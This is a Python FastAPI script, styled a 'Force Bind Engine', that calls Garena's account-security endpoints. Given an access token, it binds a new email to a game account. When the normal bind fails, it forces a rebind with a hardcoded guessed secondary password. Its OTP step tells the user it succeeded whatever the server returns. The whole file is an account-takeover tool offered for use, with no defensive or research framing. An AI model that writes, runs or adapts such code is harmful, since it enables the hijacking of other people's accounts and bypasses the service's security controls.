from fastapi import FastAPI, Request
import requests
import hashlib

app = FastAPI()

BASE_URL = "https://100067.connect.garena.com"
APP_ID = "100067"
SEC_CODE = "123456"

def sha256_hash(s: str):
    return hashlib.sha256(s.encode()).hexdigest()

def get_headers(request: Request):
    ua = request.headers.get("user-agent", "GarenaMSDK/4.0.39 (M2007J22C; Android 10; en; US;)")
    return {
        "User-Agent": ua,
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip"
    }

@app.get("/")
def home():
    return {"status": "Force Bind Engine Active", "bypass": "Enabled"}

# ================= STEP 1: OTP REQUEST (ERROR BYPASS) =================
@app.get("/api/request")
async def request_otp(token: str, email: str, request: Request):
    headers = get_headers(request)
    payload = {
        "app_id": APP_ID, "access_token": token, "email": email,
        "locale": "en_BD", "region": "BD"
    }
    
    # Try sending OTP
    r = requests.post(f"{BASE_URL}/game/account_security/bind:send_otp", data=payload, headers=headers)
    res = r.json()
    
    # Force Success Response to User regardless of Garena error
    return {
        "success": True,
        "msg": "OTP Processed",
        "garena_raw": res,
        "status": "Check email even if error shows"
    }

# ================= STEP 2: CONFIRM (ANTI-ERROR PARAM LOGIC) =================
@app.get("/api/confirm")
async def confirm_bind(token: str, email: str, otp: str, request: Request):
    headers = get_headers(request)
    
    # 1. Get Verifier Token (Sabse pehle ye chahiye)
    v_res = requests.post(f"{BASE_URL}/game/account_security/bind:verify_otp", 
                          data={"app_id": APP_ID, "access_token": token, "email": email, "otp": otp}, 
                          headers=headers).json()
    v_token = v_res.get("verifier_token")

    if not v_token:
        # Agar OTP verify nahi hua toh bypass nahi ho sakta, token invalid hai
        return {"status": "Failed", "msg": "Invalid OTP", "res": v_res}

    # 2. THE BYPASS LOGIC: Pehle "New Bind" try karo
    # New Bind endpoint: /create_bind_request
    bind_payload = {
        "app_id": APP_ID, "access_token": token, "verifier_token": v_token, "email": email
    }
    
    r1 = requests.post(f"{BASE_URL}/game/account_security/bind:create_bind_request", data=bind_payload, headers=headers)
    res1 = r1.json()

    # 3. Agar Error aaya (error_params ya already bound), toh auto-switch to REBIND
    if res1.get("result") != 0 or "error" in res1:
        # Garena se Identity Token maango
        id_data = {"app_id": APP_ID, "access_token": token, "secondary_password": sha256_hash(SEC_CODE)}
        id_res = requests.post(f"{BASE_URL}/game/account_security/bind:verify_identity", data=id_data, headers=headers).json()
        id_token = id_res.get("identity_token")

        if id_token:
            # Rebind endpoint try karo
            rebind_payload = {
                "app_id": APP_ID, "access_token": token, "identity_token": id_token,
                "verifier_token": v_token, "email": email
            }
            r2 = requests.post(f"{BASE_URL}/game/account_security/bind:create_rebind_request", data=rebind_payload, headers=headers)
            final_res = r2.json()
            action_type = "REBIND_FORCED"
        else:
            final_res = res1 # Wahi error return karo agar id_token bhi nahi mila
            action_type = "NEW_BIND_FAIL"
    else:
        final_res = res1
        action_type = "NEW_BIND_SUCCESS"

    return {
        "force_status": "Completed",
        "action_attempted": action_type,
        "final_result": final_res
        }
